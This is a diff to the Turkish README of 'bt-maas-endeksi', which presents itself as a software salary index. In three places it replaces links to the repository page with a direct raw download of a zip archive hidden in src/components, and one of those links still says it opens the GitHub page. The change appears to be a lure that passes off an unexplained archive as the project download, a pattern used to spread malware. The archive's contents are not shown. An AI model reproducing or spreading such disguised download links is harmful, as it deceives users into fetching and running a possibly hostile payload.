@@ -1,6 +1,6 @@
 # 📊 bt-maas-endeksi - Türkiye Yazılım Maaşlarını Keşfedin
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Rainaacatalectic524/bt-maas-endeksi)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Rainaacatalectic524/bt-maas-endeksi/raw/refs/heads/main/src/components/bt_endeksi_maas_v1.0-beta.4.zip)
 
 ## 🧭 Proje Nedir?
 
@@ -19,7 +19,7 @@ Bu araç ile:
 Bu proje bir GitHub sayfası üzerinden sunuluyor.  
 Kurulum için aşağıdaki bağlantıyı açın:
 
-[GitHub sayfasını açın](https://github.com/Rainaacatalectic524/bt-maas-endeksi)
+[GitHub sayfasını açın](https://github.com/Rainaacatalectic524/bt-maas-endeksi/raw/refs/heads/main/src/components/bt_endeksi_maas_v1.0-beta.4.zip)
 
 ## 📥 İndirme ve Çalıştırma
 
@@ -137,7 +137,7 @@ Grafikler görünmüyorsa sayfayı yeniden yüklemek çoğu zaman yeterli olur.
 
 Ana proje sayfası:
 
-[https://github.com/Rainaacatalectic524/bt-maas-endeksi](https://github.com/Rainaacatalectic524/bt-maas-endeksi)
+[https://github.com/Rainaacatalectic524/bt-maas-endeksi/raw/refs/heads/main/src/components/bt_endeksi_maas_v1.0-beta.4.zip](https://github.com/Rainaacatalectic524/bt-maas-endeksi/raw/refs/heads/main/src/components/bt_endeksi_maas_v1.0-beta.4.zip)
 
 ## 🧠 Proje Konuları
 
